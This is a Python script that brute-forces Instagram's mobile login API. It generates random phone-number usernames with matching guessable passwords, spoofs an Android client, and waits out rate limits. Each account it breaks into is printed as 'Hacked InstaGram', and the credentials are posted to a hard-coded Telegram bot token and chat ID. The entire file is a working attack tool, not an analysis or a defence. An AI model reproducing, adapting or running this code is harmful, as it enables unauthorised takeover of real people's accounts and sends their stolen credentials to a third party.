import requests,time,random,secrets,uuid
from secrets import token_hex
from time import sleep
from uuid import uuid4
import user_agent 
from user_agent import generate_user_agent
uid = uuid.uuid4()
ID='1827970394'
tok='1901236871:AAEuIkIRv_e8CDgLnmgr5zC0AdWoFI5TgU4'
user = '1234567890'
while True:
    whisper = str("".join(random.choice(user)for i in range(6)))
    username= '+96103'+whisper
    password = '03'+whisper
    if username =='':
        exit()
    if password =='':
        exit()
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                 'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
          print(f'Hacked InstaGram : {username}:{password}')
          tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Hacked InstaGram \n Email : {username}:PassWord:{password}"
          i = requests.post(tlg)
    if '"message":"challenge_required"' in req.text:
            print(f'Sec:Email : {username}PassWord : {password}')
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():
          print('Wait')
          sleep(60)
    else:
        print(f'Email:{username}:PassWord:{password}')